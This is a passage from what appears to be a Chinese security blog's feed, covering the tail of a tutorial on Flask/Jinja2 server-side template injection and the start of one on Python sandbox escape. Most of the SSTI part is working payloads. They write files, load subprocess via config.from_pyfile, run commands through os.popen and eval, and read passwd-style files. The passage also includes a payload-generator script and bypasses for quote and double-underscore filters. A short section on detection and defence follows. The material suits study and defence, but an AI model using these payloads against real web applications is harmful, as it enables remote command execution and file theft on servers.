class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># Python2</span><br><span class="line">?name=&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;E:/m7.txt&apos;,&apos;w&apos;).write(&apos;Mi1k7ea&apos;)&#125;&#125;</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;file&apos;](&apos;E:/passwd&apos;,&apos;w&apos;).write(&apos;Mi1k7ea&apos;)</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;file&apos;](&apos;E:/passwd&apos;,&apos;w&apos;).write(&apos;Mi1k7ea&apos;)</span><br><span class="line"></span><br><span class="line"># Python3中无file，只能用open</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;file&apos;](&apos;E:/passwd&apos;,&apos;w&apos;).write(&apos;Mi1k7ea&apos;)</span><br></pre></td></tr></table></figure><p><img src="/2019/06/02/浅析Python-Flask-SSTI/10.png" alt=""></p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>命令执行才是SSTI的重点，主要分为两种形式。</p><h4 id="利用from-pyfile加载对象到Flask配置环境"><a href="#利用from-pyfile加载对象到Flask配置环境" class="headerlink" title="利用from_pyfile加载对象到Flask配置环境"></a>利用from_pyfile加载对象到Flask配置环境</h4><p>这种利用方式算是一种简单的漏洞组合拳。</p><p>先利用文件写入漏洞写一个Python文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;E:/m7.py&apos;,&apos;w&apos;).write(&apos;from subprocess import check_output\nRUNCMD=check_output\n&apos;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/06/02/浅析Python-Flask-SSTI/11.png" alt=""></p><p>然后使用config.from_pyfile将该Python文件加载到config变量中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;config.from_pyfile(&apos;E:/m7.py&apos;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/06/02/浅析Python-Flask-SSTI/12.png" alt=""></p><p>访问全局变量config查看是否加载成功：</p><p><img src="/2019/06/02/浅析Python-Flask-SSTI/13.png" alt=""></p><p>加载成功后，就可以通过以下形式执行任意命令了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;config[&apos;RUNCMD&apos;](&apos;whoami&apos;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/06/02/浅析Python-Flask-SSTI/14.png" alt=""></p><p>可知，这种利用方式是直接有回显的。</p><h4 id="利用元素链中可利用的命令执行函数"><a href="#利用元素链中可利用的命令执行函数" class="headerlink" title="利用元素链中可利用的命令执行函数"></a>利用元素链中可利用的命令执行函数</h4><p>元素链的payload就很多，具体看<a href="https://www.mi1k7ea.com/2019/05/31/Python沙箱逃逸小结/" target="_blank" rel="noopener">《Python沙箱逃逸小结》</a>来进行各种payload的构造就好，这里只给出几个简单的示例：</p><p>os.system()的利用是无回显的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__[&apos;os&apos;].system(&apos;calc&apos;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/06/02/浅析Python-Flask-SSTI/15.png" alt=""></p><p>要想有回显，可利用如下几个：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># os.popen(cmd).read()</span><br><span class="line">?name=&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__[&apos;os&apos;].popen(&apos;whoami&apos;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"># platform.popen(cmd).read()</span><br><span class="line">?name=&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;platform&apos;).popen(&apos;whoami&apos;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"># sys.modules间接调用前面两个模块</span><br><span class="line">?name=&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;sys&apos;).modules[&apos;os&apos;].popen(&apos;whoami&apos;).read()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;sys&apos;).modules[&apos;platform&apos;].popen(&apos;whoami&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>更多的变形技巧参考<a href="https://www.mi1k7ea.com/2019/05/31/Python沙箱逃逸小结/" target="_blank" rel="noopener">《Python沙箱逃逸小结》</a>。</p><p><strong>控制结构</strong></p><p>当然，前面的利用都是基于Jinja2的变量取值语句，除此之外我们也可以利用控制结构来实现利用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 命令执行</span><br><span class="line">?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].eval(&quot;__import__(&apos;os&apos;).popen(&apos;whoami&apos;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"># 文件操作</span><br><span class="line">?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].open(&apos;E:/passwd&apos;, &apos;r&apos;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>针对Python3有个脚本会自动帮我们生成需要的控制结构形式的payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># python 3.5</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"><span class="comment"># Some of special names</span></span><br><span class="line">searchList = [<span class="string">'__init__'</span>, <span class="string">"__new__"</span>, <span class="string">'__del__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__str__'</span>, <span class="string">'__bytes__'</span>, <span class="string">'__format__'</span>, <span class="string">'__lt__'</span>, <span class="string">'__le__'</span>, <span class="string">'__eq__'</span>, <span class="string">'__ne__'</span>, <span class="string">'__gt__'</span>, <span class="string">'__ge__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__bool__'</span>, <span class="string">'__getattr__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__dir__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__get__'</span>, <span class="string">'__set__'</span>, <span class="string">'__delete__'</span>, <span class="string">'__call__'</span>, <span class="string">"__instancecheck__"</span>, <span class="string">'__subclasscheck__'</span>, <span class="string">'__len__'</span>, <span class="string">'__length_hint__'</span>, <span class="string">'__missing__'</span>,<span class="string">'__getitem__'</span>, <span class="string">'__setitem__'</span>, <span class="string">'__iter__'</span>,<span class="string">'__delitem__'</span>, <span class="string">'__reversed__'</span>, <span class="string">'__contains__'</span>, <span class="string">'__add__'</span>, <span class="string">'__sub__'</span>,<span class="string">'__mul__'</span>]</span><br><span class="line">neededFunction = [<span class="string">'eval'</span>, <span class="string">'open'</span>, <span class="string">'exec'</span>]</span><br><span class="line">pay = int(input(<span class="string">"Payload?[1|0]"</span>))</span><br><span class="line"><span class="keyword">for</span> index, i <span class="keyword">in</span> enumerate(&#123;&#125;.__class__.__base__.__subclasses__()):</span><br><span class="line">    <span class="keyword">for</span> attr <span class="keyword">in</span> searchList:</span><br><span class="line">        <span class="keyword">if</span> hasattr(i, attr):</span><br><span class="line">            <span class="keyword">if</span> eval(<span class="string">'str(i.'</span>+attr+<span class="string">')[1:9]'</span>) == <span class="string">'function'</span>:</span><br><span class="line">                <span class="keyword">for</span> goal <span class="keyword">in</span> neededFunction:</span><br><span class="line">                    <span class="keyword">if</span> (eval(<span class="string">'"'</span>+goal+<span class="string">'" in i.'</span>+attr+<span class="string">'.__globals__["__builtins__"].keys()'</span>)):</span><br><span class="line">                        <span class="keyword">if</span> pay != <span class="number">1</span>:</span><br><span class="line">                            print(i.__name__,<span class="string">":"</span>, attr, goal)</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            print(<span class="string">"&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='"</span> + i.__name__ + <span class="string">"' %&#125;&#123;&#123; c."</span> + attr + <span class="string">".__globals__['__builtins__']."</span> + goal + <span class="string">"(\"[evil]\") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;"</span>)</span><br></pre></td></tr></table></figure><p>本地Python2运行结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Payload?[1|0]1</span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'Decimal'</span> %&#125;&#123;&#123; c.__new__.__globals__[<span class="string">'__builtins__'</span>].eval(<span class="string">"[evil]"</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'Decimal'</span> %&#125;&#123;&#123; c.__new__.__globals__[<span class="string">'__builtins__'</span>].open(<span class="string">"[evil]"</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'Template'</span> %&#125;&#123;&#123; c.__new__.__globals__[<span class="string">'__builtins__'</span>].eval(<span class="string">"[evil]"</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'Template'</span> %&#125;&#123;&#123; c.__new__.__globals__[<span class="string">'__builtins__'</span>].open(<span class="string">"[evil]"</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>测试一下也是OK的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;Decimal&apos; %&#125;&#123;&#123; c.__new__.__globals__[&apos;__builtins__&apos;].eval(&quot;__import__(&apos;os&apos;).popen(&apos;whoami&apos;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/06/02/浅析Python-Flask-SSTI/18.png" alt=""></p><p>具体在Python3的表现可自行测试。</p><h2 id="0x05-结合Flask和Jinja2特性的沙箱逃逸技巧"><a href="#0x05-结合Flask和Jinja2特性的沙箱逃逸技巧" class="headerlink" title="0x05 结合Flask和Jinja2特性的沙箱逃逸技巧"></a>0x05 结合Flask和Jinja2特性的沙箱逃逸技巧</h2><p>这里只补充<a href="https://www.mi1k7ea.com/2019/05/31/Python沙箱逃逸小结/" target="_blank" rel="noopener">《Python沙箱逃逸小结》</a>中没提到的关于Flask和Jinja2结合的一些沙箱逃逸技巧。</p><h3 id="无法直接获取全局变量config"><a href="#无法直接获取全局变量config" class="headerlink" title="无法直接获取全局变量config"></a>无法直接获取全局变量config</h3><p>通过current_app的payload来替换config获取配置信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;config&#125;&#125;</span><br><span class="line">?name=&#123;&#123;url_for.__globals__[&apos;current_app&apos;].config&#125;&#125;</span><br><span class="line">?name=&#123;&#123;get_flashed_messages.__globals__[&apos;current_app&apos;].config&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h3><p>request.args是Flask中的一个属性，为返回请求的参数，这里把path当作变量名，将后面的路径传值进来，进而绕过了引号的过滤：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()&#125;&#125;&amp;path=e:/passwd</span><br></pre></td></tr></table></figure><p><img src="/2019/06/02/浅析Python-Flask-SSTI/16.png" alt=""></p><h3 id="过滤双下划线"><a href="#过滤双下划线" class="headerlink" title="过滤双下划线"></a>过滤双下划线</h3><p>同样是利用Flask的request.args属性来绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&apos;&apos;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&apos;E:/passwd&apos;).read()&#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</span><br></pre></td></tr></table></figure><p><img src="/2019/06/02/浅析Python-Flask-SSTI/17.png" alt=""></p><p>当然，也可以将其中的request.args改为request.values，利用post的方式进行传参：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /login?name=&#123;&#123;&apos;&apos;[request.values.class][request.values.mro][2][request.values.subclasses]()[40](&apos;E:/passwd&apos;).read()&#125;&#125; HTTP/1.1</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</span><br></pre></td></tr></table></figure><h2 id="0x06-检测与防御"><a href="#0x06-检测与防御" class="headerlink" title="0x06 检测与防御"></a>0x06 检测与防御</h2><p><strong>检测方法</strong></p><p>在Flask工程中全局搜索是否有使用render_template_string()函数，若存在则进一步判断该函数的第一个参数的值获取需要渲染的内容的输入形式，若为变量取值语句的形式则不存在SSTI漏洞，若为%s传入需渲染的内容的形式则存在SSTI漏洞。</p><p><strong>防御方法</strong></p><ul><li>尽量使用render_template()函数而非render_template_string()函数；</li><li>使用render_template_string()函数时，传入需渲染的内容参数时必须采用变量取值语句的形式，禁止使用%s的传参形式进行传参；</li></ul><h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><p><a href="https://bbs.ichunqiu.com/thread-47685-1-1.html" target="_blank" rel="noopener">浅析SSTI(python沙盒绕过)</a></p><p><a href="https://www.cnblogs.com/hackxf/p/10480071.html" target="_blank" rel="noopener">python-flask-ssti(模版注入漏洞)</a></p><p><a href="https://98587329.github.io/2018/06/06/python-沙箱逃逸/" target="_blank" rel="noopener">python 沙箱逃逸</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Python" scheme="https://Mi1k7ea.github.com/categories/Python/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Python" scheme="https://Mi1k7ea.github.com/tags/Python/"/>
    
      <category term="SSTI" scheme="https://Mi1k7ea.github.com/tags/SSTI/"/>
    
  </entry>
  
  <entry>
    <title>Python沙箱逃逸小结</title>
    <link href="https://Mi1k7ea.github.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/"/>
    <id>https://Mi1k7ea.github.com/2019/05/31/Python沙箱逃逸小结/</id>
    <published>2019-05-31T13:39:37.000Z</published>
    <updated>2019-06-02T09:13:07.217Z</updated>
    
    <content type="html"><![CDATA[<p>所谓的Python沙盒，即以一定的方法模拟Python终端，实现用户对Python的使用。而Python沙箱逃逸，就是攻击者通过某种绕过的方式，从模拟的沙箱环境中逃逸出来，从而实现执行系统命令等攻击操作。</p><h2 id="0x01-背景知识"><a href="#0x01-背景知识" class="headerlink" title="0x01 背景知识"></a>0x01 背景知识</h2><h3 id="dir-函数"><a href="#dir-函数" class="headerlink" title="dir()函数"></a>dir()函数</h3><p>dir() 函数不带参数时，返回当前范围内的变量、方法和定义的类型列表；带参数时，返回参数的属性、方法列表。如果参数包含方法__dir__()，该方法将被调用。如果参数不包含__dir__()，该方法将最大限度地收集参数信息。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;dir()   <span class="comment">#  获得当前模块的属性列表</span></span><br><span class="line">[<span class="string">'__builtins__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__name__'</span>, <span class="string">'__package__'</span>, <span class="string">'arr'</span>, <span class="string">'myslice'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir([ ])    <span class="comment"># 查看列表的方法</span></span><br><span class="line">[<span class="string">'__add__'</span>, <span class="string">'__class__'</span>, <span class="string">'__contains__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__delitem__'</span>, <span class="string">'__delslice__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__eq__'</span>, <span class="string">'__format__'</span>, <span class="string">'__ge__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__getitem__'</span>, <span class="string">'__getslice__'</span>, <span class="string">'__gt__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__iadd__'</span>, <span class="string">'__imul__'</span>, <span class="string">'__init__'</span>, <span class="string">'__iter__'</span>, <span class="string">'__le__'</span>, <span class="string">'__len__'</span>, <span class="string">'__lt__'</span>, <span class="string">'__mul__'</span>, <span class="string">'__ne__'</span>, <span class="string">'__new__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__reversed__'</span>, <span class="string">'__rmul__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__setitem__'</span>, <span class="string">'__setslice__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>, <span class="string">'append'</span>, <span class="string">'count'</span>, <span class="string">'extend'</span>, <span class="string">'index'</span>, <span class="string">'insert'</span>, <span class="string">'pop'</span>, <span class="string">'remove'</span>, <span class="string">'reverse'</span>, <span class="string">'sort'</span>]</span><br></pre></td></tr></table></figure><h3 id="builtins"><a href="#builtins" class="headerlink" title="__builtins__"></a>__builtins__</h3><p>__builtins__即是引用，Python程序一旦启动，它就会在程序员所写的代码运行之前就已经被加载到内存中了，而对于__builtins__却不用导入，它在任何模块都直接可见，所以可以直接调用引用的模块。</p><p>可以通过dir()函数来查看该模块内包含的函数，同时也可以通过dict属性调用这些函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下面代码可列出所有的内联函数</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(__builtins__)</span><br><span class="line">[<span class="string">'ArithmeticError'</span>, <span class="string">'AssertionError'</span>, <span class="string">'AttributeError'</span>, <span class="string">'BaseException'</span>, <span class="string">'BufferError'</span>, <span class="string">'BytesWarning'</span>, <span class="string">'DeprecationWarning'</span>, <span class="string">'EOFError'</span>, <span class="string">'Ellipsis'</span>, <span class="string">'EnvironmentError'</span>, <span class="string">'Exception'</span>, <span class="string">'False'</span>, <span class="string">'FloatingPointError'</span>, <span class="string">'FutureWarning'</span>, <span class="string">'GeneratorExit'</span>, <span class="string">'IOError'</span>, <span class="string">'ImportError'</span>, <span class="string">'ImportWarning'</span>, <span class="string">'IndentationError'</span>, <span class="string">'IndexError'</span>, <span class="string">'KeyError'</span>, <span class="string">'KeyboardInterrupt'</span>, <span class="string">'LookupError'</span>, <span class="string">'MemoryError'</span>, <span class="string">'NameError'</span>, <span class="string">'None'</span>, <span class="string">'NotImplemented'</span>, <span class="string">'NotImplementedError'</span>, <span class="string">'OSError'</span>, <span class="string">'OverflowError'</span>, <span class="string">'PendingDeprecationWarning'</span>, <span class="string">'ReferenceError'</span>, <span class="string">'RuntimeError'</span>, <span class="string">'RuntimeWarning'</span>, <span class="string">'StandardError'</span>, <span class="string">'StopIteration'</span>, <span class="string">'SyntaxError'</span>, <span class="string">'SyntaxWarning'</span>, <span class="string">'SystemError'</span>, <span class="string">'SystemExit'</span>, <span class="string">'TabError'</span>, <span class="string">'True'</span>, <span class="string">'TypeError'</span>, <span class="string">'UnboundLocalError'</span>, <span class="string">'UnicodeDecodeError'</span>, <span class="string">'UnicodeEncodeError'</span>, <span class="string">'UnicodeError'</span>, <span class="string">'UnicodeTranslateError'</span>, <span class="string">'UnicodeWarning'</span>, <span class="string">'UserWarning'</span>, <span class="string">'ValueError'</span>, <span class="string">'Warning'</span>, <span class="string">'WindowsError'</span>, <span class="string">'ZeroDivisionError'</span>, <span class="string">'_'</span>, <span class="string">'__debug__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__import__'</span>, <span class="string">'__name__'</span>, <span class="string">'__package__'</span>, <span class="string">'abs'</span>, <span class="string">'all'</span>, <span class="string">'any'</span>, <span class="string">'apply'</span>, <span class="string">'basestring'</span>, <span class="string">'bin'</span>, <span class="string">'bool'</span>, <span class="string">'buffer'</span>, <span class="string">'bytearray'</span>, <span class="string">'bytes'</span>, <span class="string">'callable'</span>, <span class="string">'chr'</span>, <span class="string">'classmethod'</span>, <span class="string">'cmp'</span>, <span class="string">'coerce'</span>, <span class="string">'compile'</span>, <span class="string">'complex'</span>, <span class="string">'copyright'</span>, <span class="string">'credits'</span>, <span class="string">'delattr'</span>, <span class="string">'dict'</span>, <span class="string">'dir'</span>, <span class="string">'divmod'</span>, <span class="string">'enumerate'</span>, <span class="string">'eval'</span>, <span class="string">'execfile'</span>, <span class="string">'exit'</span>, <span class="string">'file'</span>, <span class="string">'filter'</span>, <span class="string">'float'</span>, <span class="string">'format'</span>, <span class="string">'frozenset'</span>, <span class="string">'getattr'</span>, <span class="string">'globals'</span>, <span class="string">'hasattr'</span>, <span class="string">'hash'</span>, <span class="string">'help'</span>, <span class="string">'hex'</span>, <span class="string">'id'</span>, <span class="string">'input'</span>, <span class="string">'int'</span>, <span class="string">'intern'</span>, <span class="string">'isinstance'</span>, <span class="string">'issubclass'</span>, <span class="string">'iter'</span>, <span class="string">'len'</span>, <span class="string">'license'</span>, <span class="string">'list'</span>, <span class="string">'locals'</span>, <span class="string">'long'</span>, <span class="string">'map'</span>, <span class="string">'max'</span>, <span class="string">'memoryview'</span>, <span class="string">'min'</span>, <span class="string">'next'</span>, <span class="string">'object'</span>, <span class="string">'oct'</span>, <span class="string">'open'</span>, <span class="string">'ord'</span>, <span class="string">'pow'</span>, <span class="string">'print'</span>, <span class="string">'property'</span>, <span class="string">'quit'</span>, <span class="string">'range'</span>, <span class="string">'raw_input'</span>, <span class="string">'reduce'</span>, <span class="string">'reload'</span>, <span class="string">'repr'</span>, <span class="string">'reversed'</span>, <span class="string">'round'</span>, <span class="string">'set'</span>, <span class="string">'setattr'</span>, <span class="string">'slice'</span>, <span class="string">'sorted'</span>, <span class="string">'staticmethod'</span>, <span class="string">'str'</span>, <span class="string">'sum'</span>, <span class="string">'super'</span>, <span class="string">'tuple'</span>, <span class="string">'type'</span>, <span class="string">'unichr'</span>, <span class="string">'unicode'</span>, <span class="string">'vars'</span>, <span class="string">'xrange'</span>, <span class="string">'zip'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'ls'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python3有一个builtins模块，可以导入builtins模块后通过dir函数查看所有的内联函数</span></span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line">dir(builtins)</span><br></pre></td></tr></table></figure><h3 id="import"><a href="#import" class="headerlink" title="__import__"></a>__import__</h3><p>__import__接收字符串作为参数，导入该字符串名称的模块。</p><p>如import sys相当于__import__(‘sys’)，另外由于参数是字符串的形式，因此在某些情况下可利用字符串拼接的方式Bypass过滤，如：__import__(‘o’+’s’).system(‘ca’+’lc’)。</p><h3 id="bases"><a href="#bases" class="headerlink" title="__bases__"></a>__bases__</h3><p>列出基类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__bases__</span><br></pre></td></tr></table></figure><h3 id="mro"><a href="#mro" class="headerlink" title="__mro__"></a>__mro__</h3><p>__mro__用于展示类的继承关系，类似于bases：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__</span><br></pre></td></tr></table></figure><h3 id="globals"><a href="#globals" class="headerlink" title="__globals__"></a>__globals__</h3><p>__globals__是一个特殊属性，能够返回函数所在模块命名空间的所有变量，其中包含了很多已经引入的modules。</p><h3 id="object类"><a href="#object类" class="headerlink" title="object类"></a>object类</h3><p>python的object类中集成了很多的基础函数，我们想要调用的时候也是需要用object去操作的，主要是通过__mro__和__bases__两种方式来创建object的方法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line">[].__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">().__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">[].__class__.__mro__[<span class="number">-1</span>]</span><br><span class="line">&#123;&#125;.__class__.__mro__[<span class="number">-1</span>]</span><br><span class="line">().__class__.__mro__[<span class="number">-1</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">request.__class__.__mro__[<span class="number">8</span>] //针对jinjia2/flask为[<span class="number">9</span>]适用</span><br></pre></td></tr></table></figure><h3 id="导入模块"><a href="#导入模块" class="headerlink" title="导入模块"></a>导入模块</h3><p>常规的3种导入方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xxx</span><br><span class="line"><span class="keyword">from</span> xxx <span class="keyword">import</span> *</span><br><span class="line">__import__(<span class="string">'xxx'</span>)</span><br></pre></td></tr></table></figure><p>除此之外，也可以通过路径引入模块，如在Linux系统中Python的os模块的路径一般都是在 /usr/lib/python2.7/os.py，当知道路径的时候，我们就可以通过如下的操作导入模块，然后进一步使用相关函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">'os'</span>]=<span class="string">'/usr/lib/python2.7/os.py'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>import导入机制：当 import 一个模块时首先会在 sys.modules 这个字典中查找是否已经加载了此模块，如果加载了则只是将模块的名字加入到正在调用 import 